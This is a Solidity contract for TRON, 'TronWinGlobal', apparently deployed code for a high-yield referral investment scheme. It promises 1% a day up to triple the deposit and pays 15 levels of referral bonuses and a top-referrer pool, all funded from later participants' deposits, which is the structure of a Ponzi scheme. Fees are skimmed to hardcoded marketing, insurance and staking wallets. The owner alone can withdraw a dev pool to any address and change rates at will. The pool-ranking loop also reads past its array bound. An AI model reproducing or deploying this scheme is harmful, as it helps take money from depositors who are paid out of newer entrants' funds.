//SourceUnit: TronWinGlobal.sol

pragma solidity 0.5.10;

contract TronWinGlobal {
  using SafeMath for uint256;
    struct User {
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 direct_bonus;
        uint256 pool_bonus;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint40 deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
        uint256 total_downline_deposit;
    }

    address payable public owner;
    address payable public marketing1 = address(0x414F7FCFB3AAE6DD90A4CCDC6A48FDFC867F3A0E4B); //TYE7qSKywd112UK3HBcKjpuLUtBCRem8y6
    address payable public marketing2 = address(0x4106AEBD368E00F81293BCF4D7BCF1C51741ED06E6); //TAaYPJ9WL6zwnJCRLumeU8PiTuFaz8hRmD
    address payable public insurance1 = address(0x414424168FBC53CA517790D773AC5C794B28A5263F); //TGBWBYtyY2QFJQUHs8RJGsLx6R9EmZo5ew
    address payable public insurance2 = address(0x41BCF70C56AD8742811F994E0B384D8D5A7BA41C5A); //TTCMzLFqdNX8mE35mhrFa84CEzdc4HiqyE
    address payable public tbtcStaking = address(0x41339FD55964D4835DF1CB6027E59BDEFA5CCDC69F); //TEgAwG7RYyv4ERayzWYpjHyxuxHNTNyRin

    mapping(address => User) public users;
    mapping(uint256 => address) public id2Address;
    mapping(address => uint256) public directRefAmount;

    uint256[] public cycles;
    uint8[] public ref_bonuses;

    uint8[] public pool_bonuses;
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;
    uint256 public startTime = uint40(block.timestamp);
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;

    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;

    uint8 public devRate = 8;
    uint256 private devPool;

    uint8 public nodeRate = 10;
    uint256 public nodePool;
    uint40 public node_pool_last_draw = uint40(block.timestamp);

    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);

    constructor() public {
        owner = msg.sender;

        ref_bonuses.push(20);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);

        pool_bonuses.push(40);
        pool_bonuses.push(30);
        pool_bonuses.push(20);
        pool_bonuses.push(10);

        cycles.push(5e11);
        cycles.push(1e12);
        cycles.push(2e12);
        cycles.push(5e12);
    }

    function() payable external {
        _deposit(msg.sender, msg.value);
    }

    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);
            id2Address[total_users] = _addr;
            total_users++;

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break;

                users[_upline].total_structure++;

                _upline = users[_upline].upline;
            }
        }
    }

    function _deposit(address _addr, uint256 _amount) private {
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");

        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;

            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
            require(_amount >= (users[_addr].deposit_amount * 120 / 100) && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");
        }
        else require(_amount >= 5e8 && _amount <= cycles[0], "Bad amount");

        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].deposit_time = uint40(block.timestamp);
        users[_addr].total_deposits += _amount;

        total_deposited += _amount;

        emit NewDeposit(_addr, _amount);

        if(users[_addr].upline != address(0)) {
            uint256 temp_amount = _amount;
            directRefAmount[users[_addr].upline] = directRefAmount[users[_addr].upline].add(temp_amount);
            if(users[users[_addr].upline].deposit_amount < _amount){
              temp_amount = users[users[_addr].upline].deposit_amount;
            }
            users[users[_addr].upline].direct_bonus += temp_amount.mul(8).div(100);

            emit DirectPayout(users[_addr].upline, _addr, temp_amount.mul(8).div(100));
        }

        _pollDeposits(_addr, _amount);

        _downLineDeposits(_addr, _amount);

        if(pool_last_draw + 1 days < block.timestamp) {
            _drawPool();
        }

        nodePool = nodePool.add(_amount.div(20)); //5%

        uint256 _marketingFee = _amount.div(25); //4%
        marketing2.transfer(_marketingFee);
        marketing1.transfer(_marketingFee);

        insurance1.transfer(_amount.div(50));  //2%
        insurance2.transfer(_amount.mul(3).div(100)); //3%

        uint256 devFee = _amount.mul(devRate).div(100);
        devPool = devPool.add(devFee);
    }

    function _downLineDeposits(address _addr, uint256 _amount) private {
      address _upline = users[_addr].upline;
      for(uint8 i = 0; i < 30; i++) {
          if(_upline == address(0)) break;

          users[_upline].total_downline_deposit = users[_upline].total_downline_deposit.add(_amount);
          _upline = users[_upline].upline;
      }
    }

    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount / 100;

        address upline = users[_addr].upline;

        if(upline == address(0)) return;

        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;

            if(users[up].referrals >= i + 1) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;

                users[up].match_bonus += bonus;

                emit MatchPayout(up, _addr, bonus);
            }

            up = users[up].upline;
        }
    }

    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;

        uint256 draw_amount = pool_balance / 10;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            uint256 win = draw_amount * pool_bonuses[i] / 100;

            users[pool_top[i]].pool_bonus += win;
            pool_balance -= win;

            emit PoolPayout(pool_top[i], win);
        }

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    }

    function deposit(address _upline) payable external {
        require(block.timestamp >= startTime, 'not started');
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);

        require(users[msg.sender].payouts < max_payout, "Full payouts");

        // Deposit payout
        if(to_payout > 0) {
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;

            _refPayout(msg.sender, to_payout);
        }

        // Direct payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts += direct_bonus;
            to_payout += direct_bonus;
        }

        // Pool payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
            uint256 pool_bonus = users[msg.sender].pool_bonus;

            if(users[msg.sender].payouts + pool_bonus > max_payout) {
                pool_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].pool_bonus -= pool_bonus;
            users[msg.sender].payouts += pool_bonus;
            to_payout += pool_bonus;
        }

        // Match payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            if(users[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts += match_bonus;
            to_payout += match_bonus;
        }

        require(to_payout > 0, "Zero payout");
        require(to_payout <= ((address(this).balance).sub(devPool)), "contract drained");

        users[msg.sender].total_payouts += to_payout;
        total_withdraw += to_payout;

        uint256 tbtcStakingFee = to_payout.div(20); //1 / 20 = 5%

        tbtcStaking.transfer(tbtcStakingFee);

        emit Withdraw(msg.sender, to_payout);

        to_payout = to_payout.sub(tbtcStakingFee);
        msg.sender.transfer(to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
    }

    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 3;
    }

    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);

        if(users[_addr].deposit_payouts < max_payout) {
            payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) / 100) - users[_addr].deposit_payouts;

            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
        }
    }

    function checkDevPool() public view returns(uint256 _devPool){
      require(msg.sender == owner, "unauthorized call!");
      return devPool;
    }

    function withdrawDev(address payable _beneficiary, uint256 _amount) public{
      require(msg.sender == owner, "unauthorized call!");
      require(_amount <= devPool,"invalid withdrawAmount!");

      devPool = devPool.sub(_amount);
      _beneficiary.transfer(_amount);
    }

    function updateDevRate(uint8 _newRate) public {
      require(msg.sender == owner, "unauthorized call!");
      require(_newRate <= 20 && _newRate >= 1,"invalid _newRate!");

      devRate = _newRate;
    }

    function updateNodeRate(uint8 _newRate) public {
      require(msg.sender == owner, "unauthorized call!");
      require(_newRate <= 20 && _newRate >= 1,"invalid _newRate!");

      nodeRate = _newRate;
    }

    function updateMatchingRate(uint8 _index, uint8 _newRate) public {
      require(msg.sender == owner, "unauthorized call!");
      require(_index < 15 && _newRate <= 20,"invalid _newRate!");

      ref_bonuses[_index] = _newRate;
    }

    function distributeNodeRewards() public {
      require(msg.sender == owner, "unauthorized call!");
      require(node_pool_last_draw + 7 days < block.timestamp,"not yet");

      uint256 amount = nodePool.mul(nodeRate).div(100);
      nodePool = nodePool.sub(amount);
      owner.transfer(amount);
      node_pool_last_draw = uint40(block.timestamp);
    }


    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure, uint256 total_downline_deposit, uint256 direct_ref_amount) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure, users[_addr].total_downline_deposit, directRefAmount[_addr]);
    }

    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
    }

    function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }
}

/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}